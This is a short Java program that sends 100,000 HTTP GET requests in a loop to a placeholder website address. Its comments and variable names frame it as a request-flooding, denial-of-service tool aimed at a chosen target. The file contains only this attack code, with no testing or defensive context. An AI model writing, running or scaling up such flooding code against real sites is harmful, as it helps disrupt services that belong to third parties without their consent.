import java.net.*;

public class Main {
    public static void main(String[] args) {
        // Establish target URL
        String target = "https://www.targetwebsite.com/";

        // Set up number of requests to send
        int requests = 100000;

        // Begin sending requests
        for (int i = 0; i < requests; i++) {
            try {
                // Create URL object for target website
                URL url = new URL(target);

                // Open connection to target website
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();

                // Set request method to GET
                connection.setRequestMethod("GET");

                // Send request
                connection.getResponseCode();
            } catch (Exception e) {
                System.out.println("Error: " + e);
            }
        }
    }
}
